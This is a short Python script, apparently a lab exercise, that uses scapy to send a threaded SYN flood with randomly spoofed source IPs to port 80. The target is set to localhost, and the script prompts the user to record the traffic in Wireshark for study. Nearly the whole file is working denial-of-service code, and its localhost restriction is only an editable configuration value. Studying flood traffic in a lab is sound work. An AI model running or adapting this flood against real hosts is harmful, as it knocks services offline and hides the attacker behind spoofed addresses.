from scapy.all import *
import random
import time
import threading
import sys
import os

# CONFIGURATION - ONLY LOCALHOST!
TARGET_IP = "127.0.0.1"
TARGET_PORT = 80
DURATION = 20  # seconds
THREADS = 2    # Keep low for Windows

packets_sent = 0
running = True

def syn_flood_worker():
    global packets_sent
    while running:
        try:
            # Spoofed source IP
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            # Build SYN packet
            ip = IP(src=src_ip, dst=TARGET_IP)
            tcp = TCP(sport=random.randint(1024,65535), dport=TARGET_PORT, flags="S", seq=random.randint(1000,9000))
            packet = ip/tcp
            
            # Send
            send(packet, verbose=False)
            packets_sent += 1
            
            # Small delay to prevent system freeze
            time.sleep(0.005)
        except Exception as e:
            print(f"Error: {e}")

print("="*60)
print("SYN FLOOD ATTACK - LOCALHOST ONLY")
print("="*60)
print(f"\nTarget: {TARGET_IP}:{TARGET_PORT}")
print(f"Duration: {DURATION} seconds")
input("\n[1] START WIRESHARK CAPTURE NOW (filter: tcp.port == 80)")
input("[2] Press ENTER after Wireshark is capturing...")

print("\n[+] Starting SYN Flood...")
for _ in range(THREADS):
    thread = threading.Thread(target=syn_flood_worker)
    thread.start()

# Run for DURATION seconds
for i in range(DURATION):
    time.sleep(1)
    print(f"\r[*] Running: {i+1}s | Packets sent: {packets_sent}", end="")

running = False
print(f"\n\n[✓] COMPLETE! Total packets: {packets_sent}")
print("[✓] Average rate: {} packets/sec".format(packets_sent//DURATION))
input("\n[3] Press ENTER after saving Wireshark capture as 'syn_flood.pcap'")